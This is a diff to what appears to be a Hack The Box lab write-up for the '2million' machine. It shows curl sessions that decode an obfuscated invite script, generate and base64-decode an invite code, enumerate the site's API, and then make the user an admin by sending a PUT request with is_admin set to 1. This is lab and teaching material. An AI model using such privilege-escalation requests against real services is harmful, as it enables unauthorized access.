@@ -81,7 +81,7 @@ $ curl -X GET http://2million.htb/invite
         });
     </script>
 
-$ curl -X GET http://2million.htb/js/inviteapi.min.js
+$ curl -X GET http://2million.htb/js/inviteapi.min.js # javascript was embeded in http://2million.htb/invite see above command output
 eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',24,24,'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),0,{}))
 ```
 
@@ -149,6 +149,89 @@ $ curl -X POST http://2million.htb/api/v1/invite/generate -s | jq .
 $ echo "V0lORlYtUEwyTVotQlk1RzMtMEVBSkM=" | base64 -d
 WINFV-PL2MZ-BY5G3-0EAJC
 ```
+
+- After signuping up with the token, there was nothing interesting in the webpage moving back to API
+
+```console
+$ curl -H "Cookie: PHPSESSID=96u52drg1tebmubh0j6p7gbc2u" http://2million.htb/api/v1 -s | jq .
+{
+  "v1": {
+    "user": {
+      "GET": {
+        "/api/v1": "Route List",
+        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
+        "/api/v1/invite/generate": "Generate invite code",
+        "/api/v1/invite/verify": "Verify invite code",
+        "/api/v1/user/auth": "Check if user is authenticated",
+        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
+        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
+        "/api/v1/user/vpn/download": "Download OVPN file"
+      },
+      "POST": {
+        "/api/v1/user/register": "Register a new user",
+        "/api/v1/user/login": "Login with existing user"
+      }
+    },
+    "admin": {
+      "GET": {
+        "/api/v1/admin/auth": "Check if user is admin"
+      },
+      "POST": {
+        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
+      },
+      "PUT": {
+        "/api/v1/admin/settings/update": "Update user settings"
+      }
+    }
+  }
+}
+
+ayux@pop-os:~$ curl -H "Cookie: PHPSESSID=96u52drg1tebmubh0j6p7gbc2u" http://2million.htb/api/v1/admin/auth -s -X GET
+{"message":false}[ble: EOF]
+
+ayux@pop-os:~$ curl -H "Cookie: PHPSESSID=96u52drg1tebmubh0j6p7gbc2u" http://2million.htb/api/v1/admin/vpn/generate -s -X POST
+
+ayux@pop-os:~$ curl -H "Cookie: PHPSESSID=96u52drg1tebmubh0j6p7gbc2u" http://2million.htb/api/v1/admin/vpn/generate -s -X POST -I
+HTTP/1.1 401 Unauthorized
+Server: nginx
+Date: Sat, 28 Feb 2026 16:48:20 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+
+ayux@pop-os:~$ curl -H "Cookie: PHPSESSID=96u52drg1tebmubh0j6p7gbc2u" http://2million.htb/api/v1/admin/settings/update -s -X PUT -I
+HTTP/1.1 200 OK
+Server: nginx
+Date: Sat, 28 Feb 2026 16:48:39 GMT
+Content-Type: application/json
+Transfer-Encoding: chunked
+Connection: keep-alive
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+
+ayux@pop-os:~$ curl -H "Cookie: PHPSESSID=96u52drg1tebmubh0j6p7gbc2u" http://2million.htb/api/v1/admin/settings/update -s -X PUT
+{"status":"danger","message":"Invalid content type."}[ble: EOF]   
+
+ayux@pop-os:~$ curl -H "Cookie: PHPSESSID=96u52drg1tebmubh0j6p7gbc2u" http://2million.htb/api/v1/admin/settings/update -s -X PUT -H "Content-Type: application/json"
+{"status":"danger","message":"Missing parameter: email"}[ble: EOF]                                                                                                                             
+
+ayux@pop-os:~$ curl -H "Cookie: PHPSESSID=96u52drg1tebmubh0j6p7gbc2u" http://2million.htb/api/v1/admin/settings/update -s -X PUT -H "Content-Type: application/json" -d '{email: "z3nshell@mail.io"}'
+{"status":"danger","message":"Missing parameter: email"}[ble: EOF]                                                                                                                             
+
+ayux@pop-os:~$ curl -H "Cookie: PHPSESSID=96u52drg1tebmubh0j6p7gbc2u" http://2million.htb/api/v1/admin/settings/update -s -X PUT -H "Content-Type: application/json" -d '{"email": "z3nshell@mail.io"}'
+{"status":"danger","message":"Missing parameter: is_admin"}[ble: EOF]                                                                                                                          
+
+ayux@pop-os:~$ curl -H "Cookie: PHPSESSID=96u52drg1tebmubh0j6p7gbc2u" http://2million.htb/api/v1/admin/settings/update -s -X PUT -H "Content-Type: application/json" -d '{"email": "z3nshell@mail.io", "is_admin": true}'
+{"status":"danger","message":"Variable is_admin needs to be either 0 or 1."}[ble: EOF]                                                                                                         
+
+ayux@pop-os:~$ curl -H "Cookie: PHPSESSID=96u52drg1tebmubh0j6p7gbc2u" http://2million.htb/api/v1/admin/settings/update -s -X PUT -H "Content-Type: application/json" -d '{"email": "z3nshell@mail.io", "is_admin": 1}'
+{"id":13,"username":"z3nshell","is_admin":1}[ble: EOF]
+```
+
 
 
 
